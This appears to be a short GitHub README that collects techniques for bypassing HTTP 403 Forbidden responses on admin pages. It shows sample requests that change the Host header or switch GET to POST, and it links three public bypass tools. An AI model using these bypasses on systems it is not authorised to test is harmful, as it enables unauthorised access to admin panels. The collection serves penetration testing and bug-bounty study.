# 403bypass-collection
403bypass-collection

一) Sample Test:

1) https://sechunter.medium.com/exploiting-admin-panel-like-a-boss-fc2dd2499d31

// Original Request/Response:

GET /admin HTTP/1.1
Host: redacted.com

HTTP/1.1 403 Forbidden
Access Denied

// Modified Request/Response (Bypass):

GET /admin HTTP/1.1
Host: google.com

HTTP/1.1 200 Ok
Admin Panel Login Page(Source Code)

2) https://blog.vidocsecurity.com/blog/401-and-403-bypass-how-to-do-it-right/

HTTP Methods/Verbs fuzzing.

One of the best known is HTTP Methods/Verbs fuzzing. If you send a request with GET method and response is 401 and 403 you may want to send it again using a different method like POST, PUT , PATCH and see what happens.

// Request:

GET /admin HTTP/1.1
Host: example.com
...

Response:

HTTP/1.1 403 Forbidden
Server: Apache/2.4.41
Content-Length: 9
Connection: close

Access Denied

You can simply change method to POST

// Request:

POST /admin HTTP/1.1
Host: example.com
...

Response:

HTTP/1.1 200 OK
Server: Apache/2.4.41
Content-Length: 564
Connection: close

<!DOCTYPE html>
<html>
<head>
    <title>Admin dashboard</title>
...

二) Script :

https://github.com/devploit/nomore403 | GO script
https://github.com/topscoder/fourohme | GO script
https://github.com/Sn1r/Forbidden-Buster | python script (kinda slow)
